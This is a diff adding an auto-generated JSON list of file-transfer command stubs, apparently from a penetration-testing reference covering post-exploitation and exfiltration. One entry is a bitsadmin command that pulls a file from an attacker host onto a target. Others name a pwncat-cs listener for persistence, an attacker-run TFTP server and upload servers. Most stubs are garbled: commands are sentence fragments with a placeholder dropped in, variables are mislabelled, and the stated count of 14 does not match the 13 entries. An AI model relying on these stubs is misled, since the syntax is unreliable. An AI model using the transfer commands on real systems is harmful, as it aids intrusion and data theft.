@@ -1,0 +1,408 @@
+{
+  "metadata": {
+    "generated": "2025-11-09",
+    "source": "bulk_create_stubs.py",
+    "purpose": "Auto-generated command stubs for missing references",
+    "status": "needs-manual-enrichment",
+    "count": 14,
+    "category": "file-transfer"
+  },
+  "commands": [
+    {
+      "id": "bitsadmin",
+      "command": "bitsadmin /transfer job http://<LHOST>/<FILE> C:\\temp\\<FILE>",
+      "category": "file-transfer",
+      "tags": [
+        "file-transfer",
+        "bitsadmin",
+        "auto-generated"
+      ],
+      "description": "Auto-generated stub for bitsadmin",
+      "variables": [
+        {
+          "name": "<FILE>",
+          "description": "File path",
+          "example": "",
+          "required": true
+        },
+        {
+          "name": "<LHOST>",
+          "description": "Local/attacker IP address",
+          "example": "",
+          "required": true
+        }
+      ],
+      "output_analysis": [
+        "Review bitsadmin output for relevant information"
+      ],
+      "common_uses": [
+        "Alternative to certutil-download"
+      ],
+      "alternatives": [],
+      "prerequisites": [],
+      "next_steps": [],
+      "notes": "AUTO-GENERATED STUB - Needs manual enrichment. Referenced in data/commands/post-exploit/general-transfer.json",
+      "name": "Bitsadmin"
+    },
+    {
+      "id": "certutil",
+      "command": "certutil <TARGET> Windows 7+",
+      "category": "file-transfer",
+      "tags": [
+        "file-transfer",
+        "certutil",
+        "auto-generated"
+      ],
+      "description": "Auto-generated stub for certutil",
+      "variables": [
+        {
+          "name": "<TARGET>",
+          "description": "Target IP address or hostname",
+          "example": "",
+          "required": true
+        }
+      ],
+      "output_analysis": [
+        "Review certutil output for relevant information"
+      ],
+      "common_uses": [
+        "Alternative to vbscript-download"
+      ],
+      "alternatives": [],
+      "prerequisites": [],
+      "next_steps": [],
+      "notes": "AUTO-GENERATED STUB - Needs manual enrichment. Referenced in data/commands/post-exploit/general-transfer.json",
+      "name": "Certutil"
+    },
+    {
+      "id": "download",
+      "command": "Download <TARGET> from Sysinternals",
+      "category": "file-transfer",
+      "tags": [
+        "file-transfer",
+        "download",
+        "auto-generated"
+      ],
+      "description": "Auto-generated stub for Download",
+      "variables": [
+        {
+          "name": "<TARGET>",
+          "description": "Target IP address or hostname",
+          "example": "",
+          "required": true
+        }
+      ],
+      "output_analysis": [
+        "Review Download output for relevant information"
+      ],
+      "common_uses": [
+        "Alternative to psloggedon"
+      ],
+      "alternatives": [],
+      "prerequisites": [],
+      "next_steps": [],
+      "notes": "AUTO-GENERATED STUB - Needs manual enrichment. Referenced in data/commands/enumeration/ad-session-share-enum.json",
+      "name": "Download"
+    },
+    {
+      "id": "ftp",
+      "command": "ftp <TARGET> (login as: anonymous / anonymous)",
+      "category": "file-transfer",
+      "tags": [
+        "file-transfer",
+        "ftp",
+        "auto-generated"
+      ],
+      "description": "Auto-generated stub for ftp",
+      "variables": [
+        {
+          "name": "<TARGET>",
+          "description": "Target IP address or hostname",
+          "example": "",
+          "required": true
+        }
+      ],
+      "output_analysis": [
+        "Review ftp output for relevant information"
+      ],
+      "common_uses": [
+        "Alternative to msf-aux-ftp-anonymous"
+      ],
+      "alternatives": [],
+      "prerequisites": [],
+      "next_steps": [],
+      "notes": "AUTO-GENERATED STUB - Needs manual enrichment. Referenced in data/commands/exploitation/metasploit-auxiliary.json",
+      "name": "FTP"
+    },
+    {
+      "id": "hex",
+      "command": "Hex <TARGET> for even safer transfer",
+      "category": "file-transfer",
+      "tags": [
+        "file-transfer",
+        "hex",
+        "auto-generated"
+      ],
+      "description": "Auto-generated stub for Hex",
+      "variables": [
+        {
+          "name": "<TARGET>",
+          "description": "Target IP address or hostname",
+          "example": "",
+          "required": true
+        }
+      ],
+      "output_analysis": [
+        "Review Hex output for relevant information"
+      ],
+      "common_uses": [
+        "Alternative to file-transfer-base64"
+      ],
+      "alternatives": [],
+      "prerequisites": [],
+      "next_steps": [],
+      "notes": "AUTO-GENERATED STUB - Needs manual enrichment. Referenced in data/commands/post-exploit/exfiltration.json",
+      "name": "Hex"
+    },
+    {
+      "id": "mshta",
+      "command": "mshta <TARGET> HTML application downloads",
+      "category": "file-transfer",
+      "tags": [
+        "file-transfer",
+        "mshta",
+        "auto-generated"
+      ],
+      "description": "Auto-generated stub for mshta",
+      "variables": [
+        {
+          "name": "<TARGET>",
+          "description": "Target IP address or hostname",
+          "example": "",
+          "required": true
+        }
+      ],
+      "output_analysis": [
+        "Review mshta output for relevant information"
+      ],
+      "common_uses": [
+        "Alternative to file-transfer-bitsadmin"
+      ],
+      "alternatives": [],
+      "prerequisites": [],
+      "next_steps": [],
+      "notes": "AUTO-GENERATED STUB - Needs manual enrichment. Referenced in data/commands/post-exploit/exfiltration.json",
+      "name": "Mshta"
+    },
+    {
+      "id": "pip3",
+      "command": "pip3 <TARGET> uploadserver",
+      "category": "file-transfer",
+      "tags": [
+        "file-transfer",
+        "pip3",
+        "auto-generated"
+      ],
+      "description": "Auto-generated stub for pip3",
+      "variables": [
+        {
+          "name": "<TARGET>",
+          "description": "Target IP address or hostname",
+          "example": "",
+          "required": true
+        }
+      ],
+      "output_analysis": [
+        "Review pip3 output for relevant information"
+      ],
+      "common_uses": [
+        "Alternative to exfil-uploadserver"
+      ],
+      "alternatives": [],
+      "prerequisites": [],
+      "next_steps": [],
+      "notes": "AUTO-GENERATED STUB - Needs manual enrichment. Referenced in data/commands/post-exploit/exfiltration.json",
+      "name": "Pip3"
+    },
+    {
+      "id": "pwncat-cs-list",
+      "command": "pwncat-cs -lp <LPORT> for advanced features (file upload, persistence)",
+      "category": "file-transfer",
+      "tags": [
+        "file-transfer",
+        "pwncat-cs",
+        "auto-generated"
+      ],
+      "description": "Auto-generated stub for pwncat-cs",
+      "variables": [
+        {
+          "name": "<LPORT>",
+          "description": "Local/attacker port number",
+          "example": "",
+          "required": true
+        }
+      ],
+      "output_analysis": [
+        "Review pwncat-cs output for relevant information"
+      ],
+      "common_uses": [
+        "Alternative to nc-listener-tcp"
+      ],
+      "alternatives": [],
+      "prerequisites": [],
+      "next_steps": [],
+      "notes": "AUTO-GENERATED STUB - Needs manual enrichment. Referenced in data/commands/exploitation/ad-lateral-movement-helpers.json",
+      "name": "Pwncat Cs List"
+    },
+    {
+      "id": "split",
+      "command": "Split <TARGET> files and transfer in chunks",
+      "category": "file-transfer",
+      "tags": [
+        "file-transfer",
+        "split",
+        "auto-generated"
+      ],
+      "description": "Auto-generated stub for Split",
+      "variables": [
+        {
+          "name": "<TARGET>",
+          "description": "Target IP address or hostname",
+          "example": "",
+          "required": true
+        }
+      ],
+      "output_analysis": [
+        "Review Split output for relevant information"
+      ],
+      "common_uses": [
+        "Alternative to file-transfer-base64"
+      ],
+      "alternatives": [],
+      "prerequisites": [],
+      "next_steps": [],
+      "notes": "AUTO-GENERATED STUB - Needs manual enrichment. Referenced in data/commands/post-exploit/exfiltration.json",
+      "name": "Split"
+    },
+    {
+      "id": "tftp",
+      "command": "TFTP <TARGET> running on attacker: atftpd --daemon --port 69 /tftp",
+      "category": "file-transfer",
+      "tags": [
+        "file-transfer",
+        "tftp",
+        "auto-generated"
+      ],
+      "description": "Auto-generated stub for TFTP",
+      "variables": [
+        {
+          "name": "<TARGET>",
+          "description": "Target IP address or hostname",
+          "example": "",
+          "required": true
+        }
+      ],
+      "output_analysis": [
+        "Review TFTP output for relevant information"
+      ],
+      "common_uses": [
+        "Alternative to tftp-upload"
+      ],
+      "alternatives": [],
+      "prerequisites": [],
+      "next_steps": [],
+      "notes": "AUTO-GENERATED STUB - Needs manual enrichment. Referenced in data/commands/generated/file-transfer-additions.json",
+      "name": "Tftp"
+    },
+    {
+      "id": "transfer",
+      "command": "Transfer <TARGET> to target",
+      "category": "file-transfer",
+      "tags": [
+        "file-transfer",
+        "transfer",
+        "auto-generated"
+      ],
+      "description": "Auto-generated stub for Transfer",
+      "variables": [
+        {
+          "name": "<TARGET>",
+          "description": "Target IP address or hostname",
+          "example": "",
+          "required": true
+        }
+      ],
+      "output_analysis": [
+        "Review Transfer output for relevant information"
+      ],
+      "common_uses": [
+        "Alternative to linpeas-run"
+      ],
+      "alternatives": [],
+      "prerequisites": [],
+      "next_steps": [],
+      "notes": "AUTO-GENERATED STUB - Needs manual enrichment. Referenced in data/commands/generated/post-exploitation-additions.json",
+      "name": "Transfer"
+    },
+    {
+      "id": "updog",
+      "command": "Updog <TARGET> quick HTTP upload server",
+      "category": "file-transfer",
+      "tags": [
+        "file-transfer",
+        "updog",
+        "auto-generated"
+      ],
+      "description": "Auto-generated stub for Updog",
+      "variables": [
+        {
+          "name": "<TARGET>",
+          "description": "Target IP address or hostname",
+          "example": "",
+          "required": true
+        }
+      ],
+      "output_analysis": [
+        "Review Updog output for relevant information"
+      ],
+      "common_uses": [
+        "Alternative to file-transfer-php"
+      ],
+      "alternatives": [],
+      "prerequisites": [],
+      "next_steps": [],
+      "notes": "AUTO-GENERATED STUB - Needs manual enrichment. Referenced in data/commands/post-exploit/exfiltration.json",
+      "name": "Updog"
+    },
+    {
+      "id": "upload",
+      "command": "Upload <TARGET> and import locally",
+      "category": "file-transfer",
+      "tags": [
+        "file-transfer",
+        "upload",
+        "auto-generated"
+      ],
+      "description": "Auto-generated stub for Upload",
+      "variables": [
+        {
+          "name": "<TARGET>",
+          "description": "Target IP address or hostname",
+          "example": "",
+          "required": true
+        }
+      ],
+      "output_analysis": [
+        "Review Upload output for relevant information"
+      ],
+      "common_uses": [
+        "Alternative to win-privesc-powerup"
+      ],
+      "alternatives": [],
+      "prerequisites": [],
+      "next_steps": [],
+      "notes": "AUTO-GENERATED STUB - Needs manual enrichment. Referenced in data/commands/post-exploit/windows.json",
+      "name": "Upload"
+    }
+  ]
+}
